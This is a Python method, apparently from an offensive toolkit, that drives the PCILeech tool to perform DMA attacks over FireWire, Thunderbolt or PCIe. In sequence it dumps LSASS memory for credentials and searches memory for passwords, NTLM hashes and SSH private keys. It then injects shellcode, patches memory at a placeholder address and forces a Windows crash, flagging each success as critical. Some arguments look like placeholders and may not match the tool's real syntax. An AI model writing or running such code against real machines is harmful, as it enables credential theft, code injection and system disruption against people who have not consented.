    # ════════════════════════════════════════════════════════════════

    def pcileech_dma_attack(self, device_id: Optional[str] = None):
        """PCILeech — DMA attack via FireWire/Thunderbolt/PCIe."""
        pl = self._paths.get("pcileech")
        if not pl:
            return {"error": "pcileech not installed"}
        # Strongest attack: dump memory + search for credentials
        cmds = [
            # Dump LSASS to get credentials
            [pl, "dump", "-device", device_id or "fpga",
             "-s", "lsass.exe", "-out",
             os.path.join(self.workdir, "lsass.dmp")],
            # Search for passwords in memory
            [pl, "search", "-device", device_id or "fpga",
             "-pattern", "passwd:", "-out",
             os.path.join(self.workdir, "passwords.txt")],
            # Search for NTLM hashes
            [pl, "search", "-device", device_id or "fpga",
             "-pattern", "NTLM:", "-out",
             os.path.join(self.workdir, "hashes.txt")],
            # Search for SSH keys
            [pl, "search", "-device", device_id or "fpga",
             "-pattern", "BEGIN OPENSSH", "-out",
             os.path.join(self.workdir, "ssh_keys.txt")],
            # Inject shellcode
            [pl, "inject", "-device", device_id or "fpga",
             "-s", "shellcode.bin"],
            # Patch memory
            [pl, "patch", "-device", device_id or "fpga",
             "-addr", "0xDEADBEEF", "-data", "AA"],
            # Force BSOD (Windows)
            [pl, "forcecrash", "-device", device_id or "fpga"],
        ]
        results = []
        for c in cmds:
            r = self._run(c, timeout=300)
            out = r.get("stdout", "") + r.get("stderr", "")
            results.append(out)
            if "found" in out.lower() or "success" in out.lower():
                self._add("PCILeech — DMA Attack Success!",
                          out, "CRITICAL")
        return {"results": results}

